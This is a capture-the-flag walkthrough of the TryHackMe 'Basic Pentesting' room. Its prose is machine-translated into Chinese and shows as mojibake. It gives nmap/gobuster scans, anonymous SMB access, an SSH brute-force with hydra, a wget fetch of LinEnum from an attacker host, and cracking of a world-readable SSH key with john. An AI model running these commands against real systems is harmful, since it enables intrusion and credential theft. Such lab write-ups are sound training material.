# TryHackMe ç¼–å†™:åŸºæœ¬æµ‹è¯•

> åŸæ–‡ï¼š<https://infosecwriteups.com/tryhackme-writeup-basic-pentesting-49fb45e97058?source=collection_archive---------0----------------------->

B asic Pentesting å°†è‡ªå·±æè¿°ä¸ºâ€œ*ä¸€å°å¯ä»¥è®©ä½ ç»ƒä¹ ç½‘ç»œåº”ç”¨ç¨‹åºå…¥ä¾µå’Œæƒé™æå‡çš„æœºå™¨*([â€œé˜¿è‹â€2019](https://tryhackme.com/room/basicpentestingjt) )ã€‚åˆ›å»ºè¿™ä¸ªæˆ¿é—´æ˜¯ä¸ºäº†å‘åˆçº§æ¸—é€æµ‹è¯•äººå‘˜ä»‹ç»è¿œç¨‹å…¥ä¾µç›®æ ‡ç³»ç»Ÿçš„è‰ºæœ¯å’Œç§‘å­¦ï¼Œè¿™ç§æ”»å‡»æ€§çš„æ–¹æ³•æ”¶é›†ä¿¡æ¯å¹¶åˆ©ç”¨é“¾æ¥è·å–ç³»ç»Ÿç®¡ç†å‘˜çš„å¯†ç ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†è®¨è®ºè·å–ç³»ç»Ÿç®¡ç†å‘˜ä¸»å¯†ç çš„è¿‡ç¨‹ã€‚

![](img/a167a6f8c5e81dfe4de8304e01442d02.png)

æ¥è‡ª[è‹±é›„ç»´åŸº(2022 . 6 . 15 ä¿®è®¢ç‰ˆ)](https://hero.fandom.com/wiki/Melissa_Mao?oldid=2662360)çš„ä¸€äº›å›¾åƒç»„ä»¶

# ç›®å½•ä¸€è§ˆ

1.  ç¨‹åº
2.  ç»“æŸäº‹é¡¹
3.  å‚è€ƒ

# ç¨‹åº

è¿™ä¸ªæˆ¿é—´æ—¨åœ¨å‘ç”¨æˆ·ä»‹ç»æ¸—é€æµ‹è¯•çš„åŸºæœ¬çŸ¥è¯†ï¼Œå¹¶é€šè¿‡åˆ©ç”¨ä¸ç›®æ ‡ç³»ç»Ÿç›¸å…³çš„æ¼æ´æ¥è®¿é—®ç›®æ ‡ç³»ç»Ÿã€‚è¯¥æˆ¿é—´æœ‰ç”¨æˆ·:

*   ä½¿ç”¨ [nmap (n.d.)](https://nmap.org/) å’Œ*gobuster*([Mehlmauer et al . n . d .](https://github.com/OJ/gobuster))æ¢æµ‹å®ç”¨ç¨‹åºæ¢æµ‹ç›®æ ‡ç³»ç»Ÿï¼Œä»¥è·å–ç³»ç»Ÿä¸­æ‰“å¼€çš„ç«¯å£ä»¥åŠåœ¨å…¶ä¸­æ‰¾åˆ°çš„éšè—å­ç›®å½•ã€‚
*   å¯¹å…³é”®æœåŠ¡æˆ– web åº”ç”¨ç¨‹åºè¿›è¡Œæš´åŠ›æ”»å‡»ï¼Œä»¥è·å¾—å¯¹ç³»ç»Ÿçš„åˆå§‹è®¿é—®æƒé™ã€‚
*   åˆ©ç”¨æ”¶é›†çš„ä¿¡æ¯è·å¾—æ›´å¤šè®¿é—®æƒé™ï¼Œå¹¶ä»ç³»ç»Ÿä¸­è·å–æ›´å¤šä¿¡æ¯ã€‚

æˆ‘å°†å›ç­”æˆ¿é—´é‡Œæå‡ºçš„é—®é¢˜ï¼Œå¹¶è®¨è®ºæˆ‘å‘ç°è¿™äº›ç­”æ¡ˆçš„è¿‡ç¨‹ï¼Œæœ€ç»ˆç›®æ ‡æ˜¯æ‰¾åˆ°ç³»ç»Ÿç®¡ç†å‘˜çš„å¯†ç ã€‚

ä¸è¿™äº› TryHackMe boot2root æœºå™¨ä¸€æ ·ï¼Œæˆ‘å°†æˆ‘çš„`/etc/hosts`é…ç½®ä¸ºåŒ…å«ä¸€ä¸ªä¼ªåç§°:`basicpentestingjt.thm`ï¼Œå®ƒå°†æŒ‡å‘ç›®æ ‡ç³»ç»Ÿçš„åŠ¨æ€ IP åœ°å€ã€‚ç„¶åï¼Œæˆ‘ç‚¹å‡»è¿™ä¸ªæˆ¿é—´ç¬¬ä¸€ä¸ªä»»åŠ¡å³ä¸Šè§’çš„ç»¿è‰²â€œå¯åŠ¨æœºå™¨â€æŒ‰é’®ï¼Œå¼€å§‹æ¢æµ‹ç›®æ ‡ç³»ç»Ÿã€‚

## æ¢ç´¢

æˆ‘é¦–å…ˆåœ¨æˆ‘çš„æ”»å‡»ç®±çš„ç½‘ç»œæµè§ˆå™¨ä¸Šæµè§ˆäº†ä¸€ä¸‹`basicpentestingjt.thm`,çœ‹çœ‹æ˜¯å¦æœ‰ç½‘ç«™åœ¨ä¸Šé¢è¿è¡Œã€‚å›¾ 1 æè¿°äº†ç½‘é¡µçš„æ ·å­:

![](img/e5fa776dc70d66725924ceaf76e84b26.png)

å›¾ 1

ç„¶åï¼Œæˆ‘ä½¿ç”¨`nmap`å¯¹ç›®æ ‡ç³»ç»Ÿè¿è¡Œ TCP ç«¯å£æ‰«æ:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml --max-scan-delay=5s -T4 basicpentestingjt.thm**
[sudo] password for dna: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at [redacted]
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating Connect Scan at 21:16
Scanning basicpentestingjt.thm [65535 ports]

[... snip ...]
```

æˆ‘è¿˜ä½¿ç”¨ gobuster å®ç”¨ç¨‹åºæ¥æ¢æµ‹ web æœåŠ¡å™¨ï¼Œå¯»æ‰¾ä»»ä½•å¯èƒ½è¢«åˆ©ç”¨çš„éšè—å­ç›®å½•:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ gobuster dir -u http://basicpentestingjt.thm -w ./subdirectories.txt -x php,bak,htm,html -t 40** ===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://basicpentestingjt.thm
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                ./subdirectories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,bak,htm,html
[+] Timeout:                 10s
===============================================================
[redacted] Starting gobuster in directory enumeration mode
===============================================================

[... snip ...]
```

åœ¨`nmap`æ‰«æå®Œæˆåï¼Œæˆ‘ç”¨ [xsltproc (n.d.)](http://xmlsoft.org/xslt/xsltproc.html) å®ç”¨ç¨‹åºå°† XML è¾“å‡ºè½¬æ¢æˆå¯è¯»çš„ HTML æ–‡ä»¶:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ xsltproc tcp_scan.xml -o tcp_scan.html**

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$**
```

å›¾ 2 æè¿°äº†`nmap`æ‰«æçš„ HTML è¾“å‡º:

![](img/827155b1517ffdd606f5cd1ac6e13937.png)

å›¾ 2

æŸ¥çœ‹`nmap`çš„è¾“å‡ºï¼Œå®ƒæ­£åœ¨è¿è¡Œä¸€ä¸ª[OpenSSH(7.2p 2 ç‰ˆ)](https://www.openssh.com/txt/release-7.2p2)æœåŠ¡ï¼Œä¸€ä¸ª[Apache HTTP Server(2 . 4 . 18 ç‰ˆ)](https://www.apachelounge.com/Changelog-2.4.html)ï¼Œä¸€ä¸ª Samba SMB æœåŠ¡(å‚è§ [Samba 2016](https://www.samba.org/samba/history/samba-4.3.11.html) )ï¼Œä¸€ä¸ª Apache JServ å®ä¾‹(å‚è§[ç±³å°”æ–¯å¦ 2000](https://tomcat.apache.org/tomcat-3.3-doc/AJPv13.html) )å’Œä¸€ä¸ª Apache Tomcat å®ä¾‹(å‚è§[Apache Archives 9 . 0 . 7)ç›®æ ‡ç³»ç»Ÿå¾ˆå¯èƒ½æ­£åœ¨è¿è¡Œ](https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.7/RELEASE-NOTES) [Ubuntu Linux (n.d.)](https://ubuntu.com/about) ã€‚

åœ¨`gobuster`æ‰«æå®Œæˆåï¼Œæˆ‘è¿˜å‘ç°äº†ä¸€äº›æœ‰è¶£çš„å­ç›®å½•:

```
/.htm            (Status: 403) [Size: 300]
/.html           (Status: 403) [Size: 301]
/index.html      (Status: 200) [Size: 158]
/development     (Status: 301) [Size: 336] 
                   [--> http://basicpentestingjt.thm/development/]
/.html           (Status: 403) [Size: 301]
/.htm            (Status: 403) [Size: 300]
/server-status   (Status: 403) [Size: 309]
Progress: 1038178 / 1038220 (100.00%)==========================
[redacted] Finished
===============================================================

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$**
```

`/development`å¯¹æˆ‘æ¥è¯´æ˜¯ä¸€ä¸ªå¯ä»¥è¿›ä¸€æ­¥æ¢ç´¢çš„å­ç›®å½•ã€‚å›¾ 3 æè¿°äº†`/development`å­ç›®å½•çš„å‘ˆç°ç½‘é¡µ:

![](img/15a4630fe2aae56585d69eb027e0b633.png)

å›¾ 3

æˆ‘ä¸‹è½½äº†`dev.txt`å’Œ`j.txt`æ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹äº†å®ƒä»¬çš„å†…å®¹:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ wget http://basicpentestingjt.thm/development/dev.txt** 
--[redacted]--  http://basicpentestingjt.thm/development/dev.txt
Resolving basicpentestingjt.thm (basicpentestingjt.thm)...
Connecting to basicpentestingjt.thm:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 483 [text/plain]
Saving to: â€˜dev.txtâ€™

dev.txt   100%[==================================>]     483  --.-KB/s    in 0s      

[redacted] (12.6 MB/s) - â€˜dev.txtâ€™ saved [483/483]

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ cat dev.txt    **     

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ wget http://basicpentestingjt.thm/development/j.txt** 
--[redacted]--  http://basicpentestingjt.thm/development/j.txt
Resolving basicpentestingjt.thm (basicpentestingjt.thm)... 
Connecting to basicpentestingjt.thm:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 235 [text/plain]
Saving to: â€˜j.txtâ€™

j.txt   100%[==================================>]     235  --.-KB/s    in 0s      

[redacted] (8.83 MB/s) - â€˜j.txtâ€™ saved [235/235]

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ cat j.txt** 
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$**
```

è¿™äº›æ–‡æœ¬æ–‡ä»¶ä¼¼ä¹æ˜¯å¼€å‘äººå‘˜â€œJâ€å’Œç³»ç»Ÿç®¡ç†å‘˜â€œKâ€ä¹‹é—´çš„å†…éƒ¨é€šä¿¡ã€‚ä»è¿™äº›æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œæˆ‘å¯ä»¥æ¨æ–­å‡ºâ€œJâ€æ­£åœ¨å°è¯•ä½¿ç”¨ Apache Structs å’Œ Apache Tomcat è¿›è¡Œåº”ç”¨ç¨‹åºå¼€å‘,â€œKâ€å¯¹â€œJâ€çš„å¼±å¯†ç æ„Ÿåˆ°å¤±æœ›ã€‚â€œJâ€å¯èƒ½æ˜¯è¿›å…¥ç›®æ ‡ç³»ç»Ÿçš„â€œæœ€è–„å¼±ç¯èŠ‚â€ã€‚

æˆ‘é—®è‡ªå·±çš„é—®é¢˜æ˜¯â€œ*â€˜Jâ€™å’Œâ€˜Kâ€™åº”è¯¥æ˜¯è°ï¼Ÿä»–ä»¬çš„ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿâ€œæˆ‘å¯ä»¥é€šè¿‡è¿›ä¸€æ­¥åˆ—ä¸¾ç›®æ ‡ç³»ç»Ÿæ¥å›ç­”è¿™ä¸ªé—®é¢˜â€”â€”ç‰¹åˆ«æ˜¯é€šè¿‡æ¢ç´¢ Samba æœåŠ¡ã€‚æˆ‘ç»§ç»­ç”¨`smbmap` ( [Evans et al. n.d.](https://github.com/ShawnDEvans/smbmap) )å®ç”¨ç¨‹åºæ¥åˆ—ä¸¾å®ƒçš„ç”¨æˆ·:*

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ smbmap -H basicpentestingjt.thm** 
[+] Guest session       IP: basicpentestingjt.thm:445   Name: unknown                                           
        Disk               Permissions     Comment
        ----               -----------     -------
        Anonymous          READ ONLY
        IPC$               NO ACCESS       IPC Service 
                                               (Samba Server 4.3.11-Ubuntu)

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$**
```

æˆ‘é€šè¿‡åŒ¿åç™»å½•ä½¿ç”¨ [smbclient (n.d.)](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) è¿æ¥åˆ°`Anonymous` SMB å…±äº«:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ smbclient //basicpentestingjt.thm/Anonymous -U " "%" "** 
Try "help" to get a list of possible commands.
**smb: \>**
```

ç„¶åï¼Œæˆ‘å°è¯•è·å–ç³»ç»Ÿä¸Šçš„æ–‡ä»¶åˆ—è¡¨:

```
**smb: \> ls**
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024\. 10994236 blocks available
**smb: \>**
```

`staff.txt`æ–‡ä»¶çœ‹èµ·æ¥å¾ˆæœ‰è¶£ï¼Œæ‰€ä»¥æˆ‘å¼€å§‹ä¸‹è½½å®ƒ:

```
**smb: \> get staff.txt**
getting file \staff.txt of size 173 as staff.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
**smb: \>**
```

ç„¶åæˆ‘æ‰“å¼€äº†æ”»å‡»ç®±ä¸Šçš„`staff.txt`;å…¶å†…å®¹æ˜¯:

```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘å¯ä»¥å°†å¼€å‘äººå‘˜â€œJâ€ä¸â€œJanâ€è”ç³»èµ·æ¥ï¼Œå°†ç³»ç»Ÿç®¡ç†å‘˜â€œKâ€ä¸â€œKayâ€è”ç³»èµ·æ¥ã€‚å› ä¸ºæ®è¯´ Jan çš„ç³»ç»Ÿå¯†ç å¾ˆå¼±ï¼Œæ‰€ä»¥æœ€å¥½å°è¯•é€šè¿‡å¥¹çš„å¸æˆ·è®¿é—®ç³»ç»Ÿã€‚

## åˆå§‹è®¿é—®

æˆ‘æ¥ç€ä½¿ç”¨`hydra`å¯†ç ç ´è§£å·¥å…·( [Kali Linux Tools n.d.](https://www.kali.org/tools/hydra/) )å¯¹ç”¨æˆ·`jan`å‘èµ·å­—å…¸æ”»å‡»:

```
â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ hydra -l jan -P ./rockyou.txt basicpentestingjt.thm ssh -t 40
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at [redacted]
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[... snip ...]
```

ç‰‡åˆ»ä¹‹åï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆ:

```
[... snip ...]

[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344399 login tries (l:1/p:14344399), ~358610 tries per task
[DATA] attacking ssh://basicpentestingjt.thm:22/
[STATUS] 294.00 tries/min, 294 tries in 00:01h, 14344121 to do in 813:10h, 24 active
[STATUS] 161.67 tries/min, 485 tries in 00:03h, 14343935 to do in 1478:46h, 19 active
[22][ssh] host: **basicpentestingjt.thm   login: jan   password: [redacted]**
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 12 final worker threads did not complete until end.
[ERROR] 12 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [redacted]

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$**
```

æˆ‘ç°åœ¨æœ‰äº†`jan`çš„å¯†ç ï¼Œå¯ä»¥ç”¨ä»–ä»¬çš„å‡­è¯é€šè¿‡ SSH è®¿é—®ç³»ç»Ÿ:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ ssh jan@basicpentestingjt.thm**
The authenticity of host 'basicpentestingjt.thm' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? **yes**
Warning: Permanently added 'basicpentestingjt.thm' (ED25519) to the list of known hosts.
jan@basicpentestingjt.thm's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

[... snip ...]

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
**jan@basic2:~$**
```

éå¸¸å¥½ã€‚

## åå‰¥å‰Š

æˆ‘çš„ä¸‹ä¸€é¡¹æŠ€æœ¯æ˜¯åˆ—ä¸¾ç³»ç»Ÿçš„ç‰¹æƒæå‡æ¼æ´ã€‚æˆ‘ä½¿ç”¨ LinEnum([â€œrebotuserâ€ç­‰](https://github.com/rebootuser/LinEnum))æ¥å®ç°:

```
**jan@basic2:~$ wget http://attacker.thm:8000/LinEnum.sh**
--[redacted]--  http://attacker.thm:8000/LinEnum.sh
Connecting to attacker.thm:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
LinEnum.sh: Permission denied

Cannot write to â€˜LinEnum.shâ€™ (Success).
**jan@basic2:~$ ls
jan@basic2:~$ pwd**
/home/jan
**jan@basic2:~$ cd /tmp
jan@basic2:/tmp$ wget http://attacker.thm:8000/LinEnum.sh**
--[redacted]--  http://attacker.thm:8000/LinEnum.sh
Connecting to attacker.thm:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: â€˜LinEnum.shâ€™

LinEnum.sh     100%[==========================>]  45.54K  73.8KB/s

[redacted] (73.8 KB/s) - â€˜LinEnum.shâ€™ saved [46631/46631]

**jan@basic2:/tmp$**
```

æˆ‘æœ€åˆè¯•å›¾å°† LinEnum è„šæœ¬ä¿å­˜åˆ°ç”¨æˆ·çš„ä¸»æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯ç°åœ¨å…è®¸å†™æƒé™ã€‚ä¸è¿‡æˆ‘æˆåŠŸåœ°å°†å®ƒä¿å­˜åˆ°äº†`/tmp`æ–‡ä»¶å¤¹ä¸­ã€‚ç„¶åï¼Œæˆ‘å¼€å§‹è®©è„šæœ¬å¯æ‰§è¡Œå¹¶è¿è¡Œå®ƒ:

```
**jan@basic2:/tmp$ chmod +x LinEnum.sh
jan@basic2:/tmp$ ./LinEnum.sh**

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled

[... snip ...]
```

è¿è¡Œ *LinEnum* æ˜¾ç¤º kay çš„å¸æˆ·ä¸­æœ‰ä¸€ä¸ª`.ssh`æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”åœ¨ä»–ä»¬çš„ä¸»æ–‡ä»¶å¤¹ä¸­æœ‰ä¸€ä¸ªåä¸º pass.bak çš„æ–‡ä»¶ã€‚ä» jan çš„å¸æˆ·ä¸­æ— æ³•è¯»å–`pass.bak`æ–‡ä»¶ã€‚åœ¨ä¸Šé¢è¿è¡Œ`ls -l`ä¼šæ˜¾ç¤º SSH å¯†é’¥ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨è¿™äº›å¯†é’¥é€šè¿‡ kay ç™»å½•åˆ°ç›®æ ‡ç³»ç»Ÿï¼Œç›®æ ‡ç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥è¯»å–è¿™äº›å¯†é’¥:

```
**$ ls -l /home/kay/.ssh**
total 12
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
**$**
```

å› æ­¤ï¼Œæˆ‘å°†æ–‡ä»¶ä¸‹è½½åˆ°æˆ‘çš„æ”»å‡»ç®±ä¸­ï¼Œå¹¶ä½¿ç”¨ SSH å…¬é’¥é€šè¿‡ kay çš„å¸æˆ·è®¿é—®ç›®æ ‡ç³»ç»Ÿã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘éœ€è¦ç ´è§£ä¸ä¹‹ç›¸å…³çš„å¯†ç ã€‚æˆ‘ä½¿ç”¨å¼€è†›æ‰‹çº¦ç¿°( [Openwall n.d.](https://www.openwall.com/john/) )æ¥å®Œæˆè¿™é¡¹ä»»åŠ¡:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ ssh2john id_rsa > id_ssh2john**

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ john ./id_ssh2john --wordlist=~./rockyou.txt  **   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**beeswax          (id_rsa)**     
1g 0:00:00:00 DONE 2.173g/s 179860p/s 179860c/s 179860C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

**â”Œâ”€â”€(dnaã‰¿deniers)-[~/Documents/THM/ctf/basicpentestingjt]
â””â”€$** 
```

ç„¶åï¼Œæˆ‘ä½¿ç”¨æˆ‘çš„ AttackBox çš„ SSH å®¢æˆ·ç«¯é€šè¿‡ kay çš„å¸æˆ·è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿ:

```
**â”Œâ”€â”€(dnaã‰¿deniers)-[~/basicpentestingjt]
â””â”€$ ssh -i id_rsa kay@basicpentestingjt.thm   **         
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
**kay@basic2:~$** 
```

æˆ‘ç»ˆäºèƒ½å¤Ÿè½¬å‚¨`pass.bak`æ–‡ä»¶äº†:

```
**kay@basic2:~$ ls**
pass.bak
**kay@basic2:~$ cat pass.bak**
[redacted]
**kay@basic2:~$**
```

é˜¿æ´›æ‹‰ã€‚

# ç»“æŸäº‹é¡¹

è¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„æˆ¿é—´ï¼Œå‘åˆçº§æ¸—é€æµ‹è¯•äººå‘˜ä»‹ç»é€šè¿‡åˆ©ç”¨å¼€æºæ™ºèƒ½è·å¾—åˆå§‹è®¿é—®å¹¶è¿›ä¸€æ­¥åˆ©ç”¨åœ¨å…·æœ‰ä¸é€‚å½“æ–‡ä»¶æƒé™çš„ç›®æ ‡ç³»ç»Ÿä¸Šæ‰¾åˆ°çš„å…¬å…± SSH å¯†é’¥æ¥å…¥ä¾µç›®æ ‡ç³»ç»Ÿçš„è‰ºæœ¯å’Œç§‘å­¦ã€‚

æ²¡æœ‰é’ˆå¯¹ç›®æ ‡ç³»ç»Ÿçš„ä»£ç æ³¨å…¥æ”»å‡»ï¼›æˆ‘åªæ˜¯ç”¨ä¸€äº›è§‚å¯Ÿå’Œâ€œæ‹¼å‡‘â€å‡ºè¿™ä¸ªä¼—æ‰€å‘¨çŸ¥çš„éš¾é¢˜ã€‚è¿™ä¸ªæˆ¿é—´å¯¹äºç»éªŒä¸°å¯Œçš„æ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´æ˜¯ä¸ªå¥½åœ°æ–¹ï¼Œå› ä¸ºå®è·µæé«˜äº†ç†Ÿç»ƒç¨‹åº¦ï¼

## æ‰¿è®¤

çº¦ç¿°Â·å“ˆè’™å¾·å¯¹è¿™ä¸ªæˆ¿é—´çš„æ¼«æ¸¸([å“ˆè’™å¾· 2020](https://youtu.be/xl2Xx5YOKcI) )ï¼Œæˆ‘æ‰¿è®¤æˆ‘åœ¨å†™è¿™ç¯‡æ–‡ç« æ—¶å¶å°”ä¼šå¼•ç”¨ã€‚

## å‘¼åé‡‡å–è¡ŒåŠ¨

å¯¹äºå–œæ¬¢æˆ‘çš„ä½œå“ä½†å°šæœªæ³¨å†Œ Medium ä¼šå‘˜è®¡åˆ’çš„è¯»è€…ï¼Œå¦‚æœä»–ä»¬èƒ½é€šè¿‡æˆ‘çš„æ¨èé“¾æ¥æ³¨å†Œï¼Œæˆ‘å°†ä¸èƒœæ„Ÿæ¿€(è¿™åœ¨ç»æµä¸Šå¸®åŠ©äº†æˆ‘ https://medium.com/membership/@EpsilonCalculus â¤ï¸):[](https://medium.com/membership/@EpsilonCalculus)

æ­¤å¤–ï¼Œå¯¹äºä»»ä½•å–œæ¬¢é˜…è¯»æˆ‘çš„é»‘å®¢æ–‡ç« çš„è¯»è€…ï¼Œæˆ‘é‚€è¯·ä»–ä»¬çœ‹çœ‹æˆ‘çš„æŠ€æœ¯æ–‡ç« ç³»åˆ—ï¼Œä¸»è¦ç”± CTF çš„æ–‡ç« ç»„æˆï¼Œä½†ä¹Ÿæœ‰å…¶ä»–è®¡ç®—æœºå’Œ STEM å†…å®¹ğŸ˜ƒ

![Aleksey](img/886245347566d4089464c40d5ec5ccfc.png)

[é˜¿åˆ—å…‹è°¢](https://medium.com/@EpsilonCalculus?source=post_page-----49fb45e97058--------------------------------)

## æŠ€æœ¯æŠ¥é“

[View list](https://medium.com/@EpsilonCalculus/list/technical-writeups-63f8cfbee59c?source=post_page-----49fb45e97058--------------------------------)43 stories![](img/e91d6d5a97594a0fdfb555761a774256.png)![](img/637c9938ab55d24718c20c200ddda1a0.png)![](img/78df73524bea8b23f1be91acbb669dc6.png)

# å‚è€ƒ

Apache æ¡£æ¡ˆ(9.0.7 ç‰ˆ)ã€‚ *Apache Tomcat ç‰ˆæœ¬ 9.0.7:å‘è¡Œè¯´æ˜*ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://archive . Apache . org/dist/Tomcat/Tomcat-9/v 9 . 0 . 7/RELEASE-NOTES](https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.7/RELEASE-NOTES)

Apache HTTP æœåŠ¡å™¨(2.4.18 ç‰ˆ)ã€‚ *Changelog Apache 2.4* ã€‚é˜¿å¸•å¥‡ä¼‘æ¯å®¤ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://www.apachelounge.com/Changelog-2.4.html](https://www.apachelounge.com/Changelog-2.4.html)

ã€Šé˜¿è‹ã€‹(2019)ã€‚*åŸºæœ¬æµ‹è¯•:è¿™æ˜¯ä¸€å°å¯ä»¥è®©ä½ ç»ƒä¹ ç½‘ç»œåº”ç”¨é»‘å®¢å’Œæƒé™æå‡çš„æœºå™¨*ã€‚TryHackMeã€‚2022 å¹´ 12 æœˆ 10 æ—¥æ£€ç´¢è‡ª:[https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)

Evans ç­‰äºº(æœªæ³¨æ˜)ã€‚ *smbmap: SMBMap æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„ SMB æšä¸¾å·¥å…·*ã€‚GitHub ä»“åº“ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://github.com/ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap)

å“ˆè’™å¾· J. (2020)ã€‚TryHackMeï¼åŸºæœ¬æ¸—é€æµ‹è¯•ã€‚YouTube è§†é¢‘ã€‚2022 å¹´ 12 æœˆ 10 æ—¥æ£€ç´¢è‡ª:ã€https://youtu.be/xl2Xx5YOKcI 

